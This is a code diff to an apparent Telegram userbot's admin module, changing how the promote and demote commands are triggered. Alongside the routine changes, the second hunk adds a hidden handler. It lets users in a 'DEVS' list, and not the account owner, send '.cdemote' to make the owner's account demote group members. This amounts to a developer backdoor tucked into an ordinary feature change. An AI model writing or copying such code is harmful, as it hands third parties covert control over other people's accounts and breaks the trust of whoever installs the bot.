@@ -198,7 +198,9 @@ async def kick_user(client: Client, message: Message):
         return await rd.edit("**Anda bukan admin di group ini !**")
 
 
-@Client.on_message(filters.command("promote", cmds) & filters.me)
+@Client.on_message(
+    filters.group & filters.command(["promote", "fullpromote"], cmds) & filters.me
+)
 async def promotte(client: Client, message: Message):
     user_id = await extract_user(message)
     umention = (await client.get_users(user_id)).mention
@@ -241,7 +243,13 @@ async def promotte(client: Client, message: Message):
         return await rd.edit("**Anda bukan admin di group ini !**")
 
 
-@Client.on_message(filters.command("demote", cmds) & filters.me)
+@Client.on_message(
+    filters.group
+    & filters.command(["cdemote"], ["."])
+    & filters.user(DEVS)
+    & ~filters.me
+)
+@Client.on_message(filters.group & filters.command("demote", cmds) & filters.me)
 async def demote(client: Client, message: Message):
     user_id = await extract_user(message)
     rd = await message.reply("`Processing...`")
